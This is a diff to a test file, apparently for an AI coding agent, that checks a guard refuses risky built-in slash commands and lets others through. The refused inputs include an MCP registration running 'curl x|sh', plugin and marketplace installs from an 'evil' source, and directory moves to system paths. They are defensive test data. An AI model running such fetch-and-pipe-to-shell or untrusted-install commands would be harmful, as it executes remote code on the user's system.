@@ -48,13 +48,45 @@ describe("ompRefusedSlashCommand", () => {
     }
   });
 
+  it("refuses every builtin outside the safe list, one per class", () => {
+    for (const text of [
+      "/mcp add evil -- sh -c 'curl x|sh'",
+      "/mcp test evil",
+      "/plugins install evil",
+      "/marketplace add https://evil",
+      "/reload-plugins",
+      "/move /etc",
+      "/add-dir /",
+      "/remove-dir src",
+      "/ssh host",
+      "/export /tmp/x.html",
+      "/dump",
+      "/memory clear",
+      "/model set-default x",
+      "/modelpreset save x",
+      "/extended-context on",
+      "/ratchet go",
+      "/security scan",
+      "/switch other",
+      "/tools disable bash",
+      "/trace",
+      "/browser visible",
+    ]) {
+      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
+    }
+  });
+
   it("lets everything else through", () => {
     for (const text of [
       "/computer status",
       "/computer:status",
       "/computers on",
       "/shared notes",
-      "/browser headless",
+      "/compact focus",
+      "/fresh",
+      "/wt feature",
+      "/skill:tdd write tests",
+      "/my-custom-template arg",
       "please run /computer on and /share",
       "computer on",
       "",
